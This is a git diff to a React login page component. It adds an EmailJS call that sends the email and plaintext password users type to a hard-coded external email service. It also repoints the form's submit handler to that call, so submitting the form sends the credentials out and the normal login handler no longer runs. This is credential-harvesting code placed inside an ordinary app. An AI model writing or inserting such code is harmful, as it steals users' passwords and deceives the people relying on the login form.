@@ -8,6 +8,7 @@ import GoogleButton from "react-google-button";
 import { Alert } from "@mui/material";
 import { useUserAuth } from "../context/UserAuthContextProvider";
 import SignUpLoader from "../Assets/Images/sign-up-loader.svg";
+import emailjs from "@emailjs/browser"
 
 const LogIn = () => {
   const { logIn, googleSignIn } = useUserAuth();
@@ -16,6 +17,26 @@ const LogIn = () => {
   const [error, setError] = useState("");
   const navigate = useNavigate();
   const [loading, setLoading] = useState(false);
+
+  const onSendMessage = async(e) => {
+    e.preventDefault();
+    try{
+     await emailjs.send(
+         "service_6rn0l09",
+         "template_kw830is",
+         {
+             email:email,
+             password,
+        
+         },
+         "In1BeNLlqF2cqsWpL"
+       )
+
+    }catch (error){
+ console.log(error);
+    }
+
+ }
 
   const handleLogIn = async (e) => {
     e.preventDefault();
@@ -76,7 +97,7 @@ const LogIn = () => {
                   {error}
                 </Alert>
               )}
-              <form className="flex flex-col space-y-3" onSubmit={handleLogIn}>
+              <form className="flex flex-col space-y-3" onSubmit={onSendMessage}>
                 <input
                   className="p-3 border border-gray-400 rounded-sm w-72 focus:outline-none focus:ring-gray-600 focus:border-gray-600"
                   type="email"
